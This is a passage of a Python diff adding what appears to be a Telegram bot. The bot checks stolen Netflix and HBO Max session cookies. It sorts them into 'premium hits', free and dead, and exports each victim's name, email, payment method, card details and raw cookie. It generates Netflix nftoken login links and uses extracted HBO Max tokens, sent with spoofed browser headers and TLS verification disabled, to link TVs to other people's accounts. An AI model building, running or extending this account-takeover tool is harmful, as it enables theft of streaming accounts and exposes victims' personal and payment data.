+                zf.writestr(f"Netflix_Cookie_{idx}.txt", "\n".join(lines))
+    buf.seek(0)
+    return buf, valid
+
+
+def nf_fmt_premium(r: dict) -> str:
+    return (
+        f"{SP_MUSIC} <b>{DIV_NF}</b>\n"
+        f"      {SP_PREMIUM}  <b>NETFLIX PREMIUM HIT</b>\n"
+        f"{SP_MUSIC} <b>{DIV_NF}</b>\n\n"
+        f"{E_EMAIL}   <b>Email   :</b>  <code>{r.get('email','Unknown')}</code>\n"
+        f"{E_PLAN}   <b>Plan    :</b>  <code>{r.get('plan','Unknown')}</code>\n"
+        f"{E_COUNTRY}   <b>Country :</b>  <code>{r.get('country','Unknown')}</code>\n"
+        f"{SP_BOLT}   <b>Quality :</b>  <code>{r.get('quality','Unknown')}</code>\n"
+        f"{E_COUNT}   <b>Streams :</b>  <code>{r.get('streams','Unknown')}</code>\n"
+        f"{E_PLAN}   <b>Price   :</b>  <code>{r.get('plan_price','Unknown')}</code>\n"
+        f"{E_DATE}   <b>Billing :</b>  <code>{r.get('next_billing','Unknown')}</code>"
+    )
+
+
+def nf_fmt_free(r: dict) -> str:
+    return (
+        f"{SP_FREE}  <b>NETFLIX FREE ACCOUNT</b>\n"
+        f"──────────────────────────────\n\n"
+        f"{E_EMAIL}   <b>Email   :</b>  <code>{r.get('email','Unknown')}</code>\n"
+        f"{E_COUNTRY}   <b>Country :</b>  <code>{r.get('country','Unknown')}</code>\n"
+        f"{E_PLAN}   <b>Plan    :</b>  <code>{r.get('plan','Netflix Free')}</code>\n"
+        f"{SP_PREMIUM}   <b>Status  :</b>  <code>{r.get('membership_status','Unknown')}</code>"
+    )
+
+
+def nf_fmt_dead(r: dict) -> str:
+    return (
+        f"{SP_DEAD}  <b>DEAD</b>\n"
+        f"──────────────────────────────\n"
+        f"<i>{r.get('reason','Cookie invalid or expired')}</i>"
+    )
+
+
+def nf_fmt_token(r: dict) -> str:
+    tok = r.get("token", "Unknown")
+    return (
+        f"{SP_CODE}  <b>NF TOKEN GENERATED</b>\n"
+        f"──────────────────────────────\n\n"
+        f"{SP_CODE}   <b>Token   :</b>  <code>{tok[:50]}…</code>\n"
+        f"{E_DATE}   <b>Expires :</b>  <code>{r.get('expires','Unknown')}</code>\n\n"
+        f"<b>Links:</b>\n"
+        f"📱 <a href=\"https://www.netflix.com/unsupported?nftoken={tok}\">Phone</a>  "
+        f"🖥️ <a href=\"https://www.netflix.com/browse?nftoken={tok}\">Desktop</a>  "
+        f"📺 <a href=\"https://www.netflix.com/tv8?nftoken={tok}\">TV</a>"
+    )
+
+
+def nf_fmt_progress(done: int, total: int, hits: int, free: int, dead: int, sub: str) -> str:
+    pct    = done / total if total else 0
+    filled = int(pct * 10)
+    bar    = "█" * filled + "░" * (10 - filled)
+    if sub == "nftoken":
+        return (
+            f"{SP_CODE}  <b>NF Token — Running…</b>\n\n"
+            f"<code>[{bar}]  {int(pct*100)}%</code>\n\n"
+            f"{SP_CODE} Tokens: <b>{hits}</b>   {SP_DEAD} Failed: <b>{dead}</b>\n"
+            f"{E_FILE}  <b>{done}</b> / <b>{total}</b> checked"
+        )
+    return (
+        f"{SP_BOLT}  <b>Netflix Check — Running…</b>\n\n"
+        f"<code>[{bar}]  {int(pct*100)}%</code>\n\n"
+        f"{SP_PREMIUM} <b>{hits}</b>   {SP_FREE} <b>{free}</b>   {SP_DEAD} <b>{dead}</b>\n"
+        f"{E_FILE}  <b>{done}</b> / <b>{total}</b> checked"
+    )
+
+
+def nf_fmt_summary(hits: int, free: int, dead: int, total: int, elapsed: float, sub: str) -> str:
+    if sub == "nftoken":
+        return (
+            f"{SP_MUSIC} <b>{DIV_NF}</b>\n"
+            f"        {SP_CODE}  <b>TOKEN GEN COMPLETE</b>\n"
+            f"{SP_MUSIC} <b>{DIV_NF}</b>\n\n"
+            f"{E_COUNT}   <b>Total   :</b>  <code>{total}</code>\n"
+            f"{SP_CODE}   <b>Tokens  :</b>  <code>{hits}</code>\n"
+            f"{SP_DEAD}   <b>Failed  :</b>  <code>{dead}</code>\n\n"
+            f"{E_CLOCK}   <b>Time    :</b>  <code>{elapsed:.1f}s</code>"
+        )
+    return (
+        f"{SP_MUSIC} <b>{DIV_NF}</b>\n"
+        f"        {SP_SPARK}  <b>NETFLIX CHECK COMPLETE</b>\n"
+        f"{SP_MUSIC} <b>{DIV_NF}</b>\n\n"
+        f"{E_COUNT}   <b>Total   :</b>  <code>{total}</code>\n"
+        f"{SP_PREMIUM}   <b>Premium :</b>  <code>{hits}</code>\n"
+        f"{SP_FREE}   <b>Free    :</b>  <code>{free}</code>\n"
+        f"{SP_DEAD}   <b>Dead    :</b>  <code>{dead}</code>\n\n"
+        f"{E_CLOCK}   <b>Time    :</b>  <code>{elapsed:.1f}s</code>\n\n"
+        f"{E_ZIP} Click <b>Get Results ZIP</b> to download all hits."
+    )
+
+
+def nf_build_export(r: dict, idx: int) -> str:
+    lines = [f"========== NETFLIX HIT #{idx} =========="]
+    for key, lbl in [("name","Name"),("email","Email"),("country","Country"),
+                     ("plan","Plan"),("plan_price","Price"),("member_since","Member Since"),
+                     ("next_billing","Next Billing"),("payment_method","Payment"),
+                     ("masked_card","Card"),("quality","Quality"),("streams","Streams"),
+                     ("extra_member","Extra Member"),("email_verified","Email Verified"),
+                     ("membership_status","Status"),("profiles","Profiles"),("guid","GUID")]:
+        lines.append(f"{lbl}: {r.get(key,'Unknown')}")
+    lines.append("\nNetscape Cookie ↓\n" + r.get("content", ""))
+    return "\n".join(lines)
+
+
+def nf_build_token_export(r: dict, idx: int) -> str:
+    tok = r.get("token", "N/A")
+    return (f"========== NF TOKEN #{idx} ==========\n"
+            f"Token  : {tok}\n"
+            f"Expires: {r.get('expires','N/A')}\n\n"
+            f"Phone  : https://www.netflix.com/unsupported?nftoken={tok}\n"
+            f"Desktop: https://www.netflix.com/browse?nftoken={tok}\n"
+            f"TV     : https://www.netflix.com/tv8?nftoken={tok}")
+
+
+# ╔══════════════════════════════════════════════════════════════════════════╗
+# ║                    HBO MAX CHECKER & TV ACTIVATOR                       ║
+# ╚══════════════════════════════════════════════════════════════════════════╝
+
+HBO_LIVE = _e("6070856180345868814", "🟢")
+HBO_DEAD = _e("6100515480735321747", "❌")
+HBO_TV   = _e("5332726004253212527", "📺")
+HBO_ICON = _e("4986012398461649574", "🎬")
+
+HBO_ENDPOINTS = {
+    "amer":  {"validate": "https://default.any-amer.prd.api.hbomax.com/authentication/linkDevice/validate",
+              "connect":  "https://default.any-amer.prd.api.hbomax.com/authentication/linkDevice/connect"},
+    "emea":  {"validate": "https://default.any-emea.prd.api.hbomax.com/authentication/linkDevice/validate",
+              "connect":  "https://default.any-emea.prd.api.hbomax.com/authentication/linkDevice/connect"},
+    "latam": {"validate": "https://default.any-latam.prd.api.hbomax.com/authentication/linkDevice/validate",
+              "connect":  "https://default.any-latam.prd.api.hbomax.com/authentication/linkDevice/connect"},
+    "apac":  {"validate": "https://default.any-apac.prd.api.hbomax.com/authentication/linkDevice/validate",
+              "connect":  "https://default.any-apac.prd.api.hbomax.com/authentication/linkDevice/connect"},
+}
+
+HBO_COUNTRY_CODES = {
+    "TR": "Turkey 🇹🇷",         "US": "United States 🇺🇸", "IN": "India 🇮🇳",
+    "GB": "United Kingdom 🇬🇧", "FR": "France 🇫🇷",        "DE": "Germany 🇩🇪",
+    "ES": "Spain 🇪🇸",          "IT": "Italy 🇮🇹",          "BR": "Brazil 🇧🇷",
+    "MX": "Mexico 🇲🇽",         "AR": "Argentina 🇦🇷",      "CA": "Canada 🇨🇦",
+    "AU": "Australia 🇦🇺",      "JP": "Japan 🇯🇵",          "KR": "South Korea 🇰🇷",
+    "TH": "Thailand 🇹🇭",       "PL": "Poland 🇵🇱",
+}
+
+
+def hbo_decode_jwt(token: str) -> Optional[Dict]:
+    try:
+        parts = token.split(".")
+        if len(parts) >= 2:
+            payload = parts[1] + "=" * (4 - len(parts[1]) % 4)
+            return json.loads(base64.b64decode(payload))
+        return None
+    except Exception:
+        return None
+
+
+def hbo_extract_st_token(content: str) -> Optional[str]:
+    m = re.search(r"^st:\s*(eyJ[A-Za-z0-9_\-\.]+)", content, re.MULTILINE)
+    if m:
+        return m.group(1)
+    m = re.search(r"st=([^;\s]+)", content)
+    if m and len(m.group(1).split(".")) == 3:
+        return m.group(1)
+    m = re.search(r"(eyJ[A-Za-z0-9_\-\.]+)", content)
+    if m and len(m.group(1).split(".")) == 3:
+        return m.group(1)
+    return None
+
+
+def hbo_get_region(st_token: str) -> str:
+    decoded = hbo_decode_jwt(st_token)
+    if decoded:
+        sub = decoded.get("subdivision", "")
+        for region in ("amer", "emea", "latam", "apac"):
+            if region in sub:
+                return region
+    return "amer"
+
+
+def hbo_get_user_info(st_token: str, region: str) -> Optional[Dict]:
+    url = f"https://default.beam-{region}.prd.api.hbomax.com/users/me"
+    headers = {
+        "accept": "*/*", "accept-language": "en-US,en;q=0.9",
+        "content-type": "application/json",
+        "cookie": f"st={st_token}",
+        "origin": "https://play.hbomax.com",
+        "referer": "https://play.hbomax.com/",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "x-disco-client": "WEB:10:hbomax:7.4.0",
+        "x-disco-params": "realm=bolt,bid=beam,features=ar",
+        "x-device-info": "hbomax/7.4.0 (desktop/desktop; Windows/10; test/test)",
+    }
+    try:
+        r = requests.get(url, headers=headers, timeout=20, verify=False)
+        return r.json() if r.status_code == 200 else None
+    except Exception:
+        return None
+
+
+def hbo_validate(st_token: str, region: str):
+    data = hbo_get_user_info(st_token, region)
+    if not data:
+        return False, None, None
+    attrs = data.get("data", {}).get("attributes", {})
+    if not attrs:
+        return False, None, None
+    email = attrs.get("username", "Unknown")
+    if email and "@" not in email:
+        email = f"{email}@hbomax.com"
+    country = attrs.get("verifiedHomeTerritory", "Unknown")
+    country = HBO_COUNTRY_CODES.get(country, country)
+    return True, email, country
+
+
+def hbo_generate_device_info() -> str:
+    info = {
+        "deviceId": str(uuid.uuid4()), "deviceName": "Chrome",
+        "deviceModel": "Windows", "deviceType": "BROWSER",
+        "osVersion": "10.0.0", "appVersion": "7.4.0",
+        "manufacturer": "Google", "screenWidth": 1920,
+        "screenHeight": 1080, "language": "en-US",
+        "timezone": "America/New_York",
+    }
+    return base64.b64encode(json.dumps(info).encode()).decode()
+
+
+def hbo_activate_tv(st_token: str, tv_code: str, region: str) -> tuple:
+    headers = {
+        "accept": "*/*", "content-type": "application/json",
+        "cookie": f"st={st_token}",
+        "origin": "https://auth.hbomax.com",
+        "referer": "https://auth.hbomax.com/",
+        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "x-disco-client": "WEB:10:hbomax:7.4.0",
+        "x-disco-params": f"realm=bolt,bid=beam,features=ar,clientId=web_{uuid.uuid4().hex[:16]}",
+        "x-disco-device-info": hbo_generate_device_info(),
+        "x-device-info": "hbomax/7.4.0 (desktop/desktop; Windows/10; test/test)",
+        "x-wbd-ace": "MjAyNi0wNi0xMVQxOTowNzo1M1p8VVMtQ0F8U0x8MVlOTg==",
+        "x-wbd-device-consent": "gpc=0",
+        "x-wbd-preferred-language": "en-US,en",
+        "x-wbd-time-zone": "Asia/Calcutta",
+        "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
+        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors",
+        "sec-fetch-site": "same-site",
+    }
+    payload = {"linkingCode": tv_code}
+    try:
+        r1 = requests.post(HBO_ENDPOINTS[region]["validate"],
+                           headers=headers, json=payload, timeout=20, verify=False)
+        if r1.status_code in (200, 204):
+            r2 = requests.post(HBO_ENDPOINTS[region]["connect"],
+                               headers=headers, json=payload, timeout=20, verify=False)
+            return (True, "success") if r2.status_code in (200, 204) else (False, "activation_failed")
+        if r1.status_code == 400:
+            for err in r1.json().get("errors", []):
+                code = err.get("code", "")
+                if code == "invalid.code":
+                    return False, "invalid_code"
+                if code == "expired.code":
+                    return False, "expired_code"
+        return False, "unknown_error"
+    except Exception as e:
+        return False, f"exception: {str(e)[:60]}"
+
+
+def hbo_check_file(filepath: str) -> Dict:
+    fname = os.path.basename(filepath)
+    try:
+        with open(filepath, "r", encoding="utf-8", errors="ignore") as fh:
+            content = fh.read()
+        st_token = hbo_extract_st_token(content)
+        if not st_token:
+            return {"status": "DEAD", "reason": "No st token found",
+                    "filename": fname, "content": content}
+        decoded = hbo_decode_jwt(st_token)
+        if decoded:
+            exp = decoded.get("exp", 0)
+            if exp and datetime.fromtimestamp(exp) < datetime.now():
+                return {"status": "DEAD", "reason": "Token expired (JWT)",
+                        "filename": fname, "content": content, "st_token": st_token}
+        region = hbo_get_region(st_token)
+        valid, email, country = hbo_validate(st_token, region)
+        if valid:
+            return {"status": "LIVE", "email": email, "country": country,
+                    "region": region, "st_token": st_token,
+                    "filename": fname, "content": content}
+        return {"status": "DEAD", "reason": "Account invalid / no subscription",
+                "filename": fname, "content": content, "st_token": st_token}
+    except Exception as e:
+        return {"status": "DEAD", "reason": str(e)[:80], "filename": fname, "content": ""}
+
+
+def hbo_fmt_single(r: dict) -> str:
+    if r["status"] == "LIVE":
+        return (
+            f"╔══════════════════════════════╗\n"
+            f"║  {HBO_LIVE} <b>HBO Max — LIVE</b>           ║\n"
+            f"╚══════════════════════════════╝\n\n"
+            f"{E_EMAIL}  <b>Email   :</b> <code>{r.get('email','Unknown')}</code>\n"
+            f"{E_COUNTRY}  <b>Country :</b> <code>{r.get('country','Unknown')}</code>\n"
+            f"{E_PLAN}  <b>Region  :</b> <code>{r.get('region','?').upper()}</code>\n\n"
+            f"<i>Tap {HBO_TV} Activate TV to log in a device.</i>"
+        )
+    return (
+        f"╔═══════════════════════════╗\n"
+        f"║  {HBO_DEAD} <b>HBO Max — DEAD</b>          ║\n"
+        f"╚═══════════════════════════╝\n\n"
+        f"{E_FILE}  <b>File   :</b> <code>{r.get('filename','?')}</code>\n"
+        f"{HBO_DEAD}  <b>Reason :</b> <code>{r.get('reason','Invalid')}</code>"
+    )
+
+
+def hbo_fmt_summary(total: int, live: int, dead: int, elapsed: float) -> str:
+    pct = f"{live / total * 100:.1f}" if total else "0.0"
+    return (
+        f"{HBO_ICON} <b>HBO Max Results</b>\n\n"
+        f"{E_COUNT}  Checked : <b>{total}</b>\n"
+        f"{HBO_LIVE}  Live    : <b>{live}</b>  ({pct}%)\n"
+        f"{HBO_DEAD}  Dead    : <b>{dead}</b>\n\n"
+        f"{E_CLOCK}  Time    : <code>{elapsed:.1f}s</code>\n\n"
+        f"{E_ZIP} Click <b>Results ZIP</b> to download live cookies."
+    )
+
+
+# ══════════════════════════ END OF CHUNK 3 ══════════════════════════
